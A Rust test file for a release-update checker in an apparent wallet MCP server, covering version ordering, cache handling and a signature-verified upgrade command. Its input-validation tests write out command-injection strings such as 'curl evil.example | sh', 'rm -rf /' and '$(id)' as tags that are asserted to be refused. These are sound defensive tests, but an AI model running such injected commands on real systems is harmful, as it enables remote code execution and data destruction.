//! Tests for [`super`].
//!
//! Out of line so the audit corpus is production code: V12 bills measured
//! bytes and excludes `*_test.rs` by default.

use super::*;

const REPOSITORY: &str = "EkuboProtocol/wallet-mcp-server";

fn at(text: &str) -> DateTime<Utc> {
    text.parse().expect("a fixed timestamp")
}

/// The check with no network and a fixed clock. `fetch` is what the endpoint
/// would have answered.
async fn check_at(
    data_dir: &Path,
    installed: &str,
    now: DateTime<Utc>,
    fetch: Option<&str>,
) -> ReleaseCheck {
    let fetch = fetch.map(str::to_string);
    check_with(data_dir, installed, REPOSITORY, now, false, || async {
        fetch
    })
    .await
}

#[test]
fn a_published_release_supersedes_an_older_one() {
    assert_eq!(is_newer("1.4.2", "v1.5.0"), Some(true));
    assert_eq!(is_newer("1.4.2", "v1.4.3"), Some(true));
    assert_eq!(is_newer("1.4.2", "v2.0.0"), Some(true));
    assert_eq!(is_newer("1.4.2", "v1.4.2"), Some(false));
    assert_eq!(is_newer("1.5.0", "v1.4.2"), Some(false));
    // Shorter cores compare as if zero-padded, so `1.5` is not behind `1.5.0`.
    assert_eq!(is_newer("1.5", "v1.5.0"), Some(false));
    assert_eq!(is_newer("1.5", "v1.5.1"), Some(true));
}

#[test]
fn a_release_supersedes_a_prerelease_of_itself() {
    // The case that matters while `BUILD_VERSION` is an `-rc` build: the
    // numeric cores are equal and the running build is still behind.
    assert_eq!(is_newer("1.0.0-rc.0+8133a00", "v1.0.0"), Some(true));
    assert_eq!(is_newer("1.0.0-rc.0+8133a00", "v1.0.0-rc.0"), Some(false));
    assert_eq!(is_newer("1.0.0", "v1.0.0-rc.1"), Some(false));
}

#[test]
fn an_unparseable_version_is_unknown_rather_than_an_upgrade() {
    // Never `Some(true)`: an answer nobody can order must not become a
    // recommendation to install something.
    assert_eq!(is_newer("1.4.2", "nightly"), None);
    assert_eq!(is_newer("not-a-version", "v1.5.0"), None);
    assert_eq!(is_newer("1.4.2", ""), None);
}

#[test]
fn a_tag_that_could_escape_a_shell_command_is_refused() {
    // `upgrade_command` is handed to an agent that may run it, so a tag is
    // only ever alphanumerics and version punctuation. Each of these would
    // otherwise reach a shell with a network operator choosing the payload.
    assert!(!valid_tag("v1.0.0; curl evil.example | sh"));
    assert!(!valid_tag("v1.0.0 && rm -rf /"));
    assert!(!valid_tag("v1.0.0\nrm -rf /"));
    assert!(!valid_tag("$(id)"));
    assert!(!valid_tag("`id`"));
    assert!(!valid_tag("../../etc/passwd"));
    assert!(!valid_tag(""));
    assert!(!valid_tag(&"v1.0.0".repeat(20)));

    assert!(valid_tag("v1.0.0"));
    assert!(valid_tag("v1.0.0-rc.1"));
    assert!(valid_tag("1.0.0+8133a00"));
}

#[test]
fn a_repository_override_is_owner_and_name_only() {
    assert!(valid_repository("EkuboProtocol/wallet-mcp-server"));
    assert!(valid_repository("owner/name.with.dots"));

    assert!(!valid_repository("EkuboProtocol"));
    assert!(!valid_repository("owner/name/extra"));
    assert!(!valid_repository("owner/"));
    assert!(!valid_repository("/name"));
    assert!(!valid_repository("owner/name; id"));
    assert!(!valid_repository("../../../etc"));
}

#[tokio::test]
async fn an_available_update_carries_the_command_that_installs_it() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    assert!(check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
    assert_eq!(check.source, CheckSource::Network);
    // Pinned to the resolved tag, not to `main`: the script and the release it
    // installs have to agree about what the binary's subcommands are called.
    //
    // And the installer is verified before it runs. `install.sh` checks
    // everything it downloads, but a shell starts executing a piped script as
    // it arrives, so those checks only ever ran if whoever chose the script's
    // bytes wanted them to. Verifying a payload with a script the same party
    // can replace proves nothing.
    let command = check.upgrade_command.clone().expect("an update installs");
    assert_eq!(
        command,
        "d=$(mktemp -d) && \
curl -fsSL -o \"$d/install.sh\" https://github.com/EkuboProtocol/wallet-mcp-server/releases/download/v1.5.0/install.sh && \
curl -fsSL -o \"$d/install.sh.sigstore.json\" https://github.com/EkuboProtocol/wallet-mcp-server/releases/download/v1.5.0/install.sh.sigstore.json && \
cosign verify-blob --bundle \"$d/install.sh.sigstore.json\" \
--certificate-identity https://github.com/EkuboProtocol/wallet-mcp-server/.github/workflows/release.yml@refs/tags/v1.5.0 \
--certificate-oidc-issuer https://token.actions.githubusercontent.com \
\"$d/install.sh\" && \
sh \"$d/install.sh\""
    );
    // The properties that matter, stated separately so a future rewording of
    // the command cannot quietly drop one of them.
    assert!(
        !command.contains("raw.githubusercontent.com"),
        "the installer must come from the signed release assets, not the raw source tree"
    );
    assert!(
        !command.contains("| sh") && !command.contains("|sh"),
        "nothing may pipe an unverified script into a shell: {command}"
    );
    assert!(
        command.contains("cosign verify-blob"),
        "the installer's signature must be checked before it runs"
    );
    assert!(
        command
            .split("cosign verify-blob")
            .nth(1)
            .is_some_and(|rest| rest.contains("sh \"$d/install.sh\"")),
        "the run has to come after the verification, not before it"
    );
    assert!(
        !command.contains("; sh") && !command.contains("|| "),
        "a failed download or verification must stop the sequence: {command}"
    );
    assert!(
        command.contains("@refs/tags/v1.5.0"),
        "the signature is checked against this tag's release workflow, not any workflow"
    );
    assert_eq!(
        check.release_url.as_deref(),
        Some("https://github.com/EkuboProtocol/wallet-mcp-server/releases/tag/v1.5.0")
    );
    // The agent is told the running process keeps its version until a restart.
    assert!(check.instruction.contains("restart"));
    assert!(check.notice().is_some());
}

#[tokio::test]
async fn a_current_build_offers_no_command_and_no_notice() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(
        directory.path(),
        "1.5.0",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    assert!(!check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
    // No command to run means no command to hand an agent that might run it.
    assert!(check.upgrade_command.is_none());
    assert!(check.notice().is_none());
}

#[tokio::test]
async fn a_malicious_tag_is_discarded_rather_than_interpolated() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0; curl evil.example | sh"),
    )
    .await;

    assert!(!check.update_available);
    assert!(check.upgrade_command.is_none());
    assert!(check.latest_version.is_none());
    // And nothing about it was written down for the next call to trust.
    assert!(!directory.path().join(CACHE_FILE).exists());
}

#[tokio::test]
async fn a_fresh_cache_answers_without_asking_the_endpoint() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let first = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;
    assert_eq!(first.source, CheckSource::Network);

    // An hour later, with an endpoint that would panic if it were consulted.
    let second = check_with(
        directory.path(),
        "1.4.2",
        REPOSITORY,
        at("2026-08-08T01:00:00Z"),
        false,
        || async { panic!("the endpoint must not be asked inside the cache window") },
    )
    .await;

    assert_eq!(second.source, CheckSource::Cache);
    assert_eq!(second.latest_version.as_deref(), Some("v1.5.0"));
    assert_eq!(second.checked_at, Some(at("2026-08-08T00:00:00Z")));
}

#[tokio::test]
async fn a_stale_cache_is_refreshed() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    let later = check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-09T00:00:01Z"),
        Some("v1.6.0"),
    )
    .await;

    assert_eq!(later.source, CheckSource::Network);
    assert_eq!(later.latest_version.as_deref(), Some("v1.6.0"));
}

#[tokio::test]
async fn a_cache_dated_in_the_future_is_stale_rather_than_permanent() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    // The clock moved backwards. Without the lower bound this cache would
    // never expire.
    let earlier = check_at(
        directory.path(),
        "1.4.2",
        at("2026-01-01T00:00:00Z"),
        Some("v1.6.0"),
    )
    .await;

    assert_eq!(earlier.source, CheckSource::Network);
    assert_eq!(earlier.latest_version.as_deref(), Some("v1.6.0"));
}

#[tokio::test]
async fn a_cache_from_another_repository_is_not_reused() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v3.1.3"),
    )
    .await;

    // Same day, same cache file, different repository. Reusing the tag here
    // would name a release URL and an install command for a tag the other
    // repository never published.
    let elsewhere = check_with(
        directory.path(),
        "1.4.2",
        "someone/fork",
        at("2026-08-08T01:00:00Z"),
        false,
        || async { Some("v1.5.0".to_string()) },
    )
    .await;

    assert_eq!(elsewhere.source, CheckSource::Network);
    assert_eq!(elsewhere.latest_version.as_deref(), Some("v1.5.0"));
    let elsewhere_command = elsewhere
        .upgrade_command
        .clone()
        .expect("the fork offers an upgrade too");
    // What this test is about is that the command names the fork rather than
    // the cached repository, and it names it in both places that decide: where
    // the installer comes from, and whose workflow must have signed it.
    assert!(
        elsewhere_command
            .contains("https://github.com/someone/fork/releases/download/v1.5.0/install.sh")
            && elsewhere_command.contains(
                "https://github.com/someone/fork/.github/workflows/release.yml@refs/tags/v1.5.0"
            ),
        "{elsewhere_command}"
    );
    assert_eq!(
        elsewhere.release_url.as_deref(),
        Some("https://github.com/someone/fork/releases/tag/v1.5.0")
    );
}

#[tokio::test]
async fn an_unreachable_endpoint_falls_back_to_a_stale_answer() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    check_at(
        directory.path(),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    // Offline, a week later. The named release was still published, and the
    // only thing its age can cause is failing to mention a newer one.
    let offline = check_at(directory.path(), "1.4.2", at("2026-08-15T00:00:00Z"), None).await;

    assert_eq!(offline.source, CheckSource::Cache);
    assert!(offline.update_available);
    assert_eq!(offline.checked_at, Some(at("2026-08-08T00:00:00Z")));
}

#[tokio::test]
async fn being_offline_with_nothing_cached_is_not_an_error() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_at(directory.path(), "1.4.2", at("2026-08-08T00:00:00Z"), None).await;

    assert_eq!(check.source, CheckSource::Unavailable);
    assert!(!check.update_available);
    assert!(check.latest_version.is_none());
    assert!(check.notice().is_none());
    // The agent is told explicitly not to read this as a reason to upgrade.
    assert!(check.instruction.contains("Do not retry"));
}

#[tokio::test]
async fn the_environment_can_turn_the_check_off_entirely() {
    let directory = tempfile::tempdir().expect("a temporary directory");
    let check = check_with(
        directory.path(),
        "1.4.2",
        REPOSITORY,
        at("2026-08-08T00:00:00Z"),
        true,
        || async { panic!("a disabled check must not reach the endpoint") },
    )
    .await;

    assert_eq!(check.source, CheckSource::Disabled);
    assert!(!check.update_available);
    assert!(check.notice().is_none());
}

#[tokio::test]
async fn an_unwritable_data_directory_still_answers() {
    // The cache is an optimisation. Losing it costs a request next time and
    // must not cost the answer this time.
    let check = check_at(
        Path::new("/nonexistent/ekubo-wallet-release-check"),
        "1.4.2",
        at("2026-08-08T00:00:00Z"),
        Some("v1.5.0"),
    )
    .await;

    assert!(check.update_available);
    assert_eq!(check.latest_version.as_deref(), Some("v1.5.0"));
}
